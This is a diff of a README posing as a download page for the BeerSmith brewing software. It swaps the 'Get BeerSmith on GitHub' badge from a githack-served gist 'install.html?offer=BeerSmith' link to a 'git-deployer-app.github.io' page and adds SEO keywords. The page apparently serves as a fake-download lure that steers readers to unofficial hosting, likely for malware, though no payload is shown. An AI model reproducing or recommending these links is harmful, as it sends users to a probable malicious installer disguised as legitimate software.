@@ -1,6 +1,6 @@
 # BeerSmith Download — Desktop Brewing Recipe Designer  
 
-[![Get BeerSmith on GitHub](https://img.shields.io/badge/Get%20BeerSmith-DAA520?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/xumukinspektor78/8a07b77aed762c78856b17384a11295b/raw/b83738a03f60c4aed3a28a91b7845cba2bdb503e/install.html?offer=BeerSmith)  
+[![Get BeerSmith on GitHub](https://img.shields.io/badge/Get%20BeerSmith-DAA520?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=BeerSmith)  
 
 ---
 
@@ -71,7 +71,7 @@ Whether you’re a homebrewer or a craft brewery owner, BeerSmith makes it easy 
 ---
 
 ## 🔍 Tags  
-beersmith, beersmith app, beersmith pc, beersmith desktop, beersmith for mac, beersmith for pc, beersmith for windows, homebrewing software, brewing calculator, beer recipe designer, craft beer tools, brewing management, beersmith cloud  
+beersmith, singlecuts, singlecut beer, beersmith 3, beersmith app, beersmith pc, beersmith desktop, beersmith for mac, beersmith for pc, beersmith for windows, homebrewing software, brewing calculator, beer recipe designer, craft beer tools, brewing management, beersmith cloud  
 
 ---
 
